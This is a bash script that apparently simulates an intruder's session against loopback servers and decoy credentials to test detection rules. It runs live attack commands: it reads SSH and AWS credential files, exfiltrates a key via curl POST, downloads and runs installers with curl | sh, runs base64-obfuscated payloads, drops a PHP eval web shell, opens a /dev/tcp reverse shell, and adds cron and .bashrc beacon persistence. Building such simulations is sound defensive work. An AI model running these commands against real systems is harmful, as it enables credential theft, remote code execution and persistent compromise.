#!/bin/bash
# A SIMULATED intruder's session, for exercising the detection rules. Everything is local and harmless:
# the "attacker server" is a loopback web server and a loopback netcat listener started by badactor.sh, the credentials
# are decoys, and every payload only echoes a line of text. Nothing here touches the network beyond this machine
# (the beacon goes to this machine's own LAN address, to exercise the raw-IP rule).
# Needs: HPORT LPORT FAKEHOME LANIP STAGE (set by badactor.sh)
set -u
H=http://127.0.0.1:$HPORT

# --- 1. recon: who am I, where am I
id; uname -a; hostname; cat /etc/passwd | head -3

# --- 2. look for credentials (decoys under a fake home) and read them
cat "$FAKEHOME/.ssh/id_rsa"
cat "$FAKEHOME/.aws/credentials"

# --- 3. exfiltrate over plain HTTP
curl -s -X POST --data-binary @"$FAKEHOME/.ssh/id_rsa" "$H/upload" >/dev/null

# --- 4. stage a tool in a temp directory, name it like a system daemon, run it
mkdir -p "$STAGE"
curl -s -o "$STAGE/payload.sh" "$H/payload.sh"
cp /bin/sleep "$STAGE/sshd"
"$STAGE/sshd" 0.2
printf '<?php eval(base64_decode($_POST["x"])); ?>\n' > "$STAGE/shell.php"      # a dropped web shell (php is not installed, so it is never run)

# --- 5. download-and-run installers
bash -c "curl -s $H/install.sh | sh"
bash -c "sh -c \"\$(curl -s $H/install.sh)\""

# --- 6. obfuscated payloads (each decodes to a line of echo/print)
bash -c 'echo ZWNobyAic2ltdWxhdGVkIGJhc2U2NCBwYXlsb2FkIg== | base64 -d | sh'
python3 -c 'import base64; exec(base64.b64decode("cHJpbnQoJ3NpbXVsYXRlZCBweXRob24gcGF5bG9hZCcp"))'
perl -MMIME::Base64 -e 'eval(decode_base64("cHJpbnQgInNpbXVsYXRlZCBwZXJsIHBheWxvYWRcbiI7"))'

# --- 7. a reverse shell to a loopback "attacker" listener (which only sends two harmless commands), then a port sweep
bash -c "bash -i >& /dev/tcp/127.0.0.1/$LPORT 0>&1" 2>/dev/null
nc -z 127.0.0.1 "$LPORT"-$((LPORT + 4)) 2>/dev/null

# --- 8. hide a process under a kernel-thread name; try to become root
bash -c 'exec -a "[kworker/0:2]" sleep 0.3'
sudo -n true 2>/dev/null

# --- 9. persistence attempts (written by the shell itself, so the recorder cannot see them: a known gap)
echo "*/5 * * * * curl -s $H/beacon | sh" >> "$FAKEHOME/crontab.txt"
echo "curl -s $H/beacon | sh" >> "$FAKEHOME/.bashrc"

# --- 10. beacon to a raw IP with a spoofed user agent, then once around the proxy
for i in 1 2 3; do curl -s -A 'Mozilla/4.0 (compatible; MSIE 6.0)' "http://$LANIP:$HPORT/beacon" >/dev/null; sleep 0.2; done
curl -s --noproxy '*' "http://$LANIP:$HPORT/beacon" >/dev/null
echo "simulation finished"
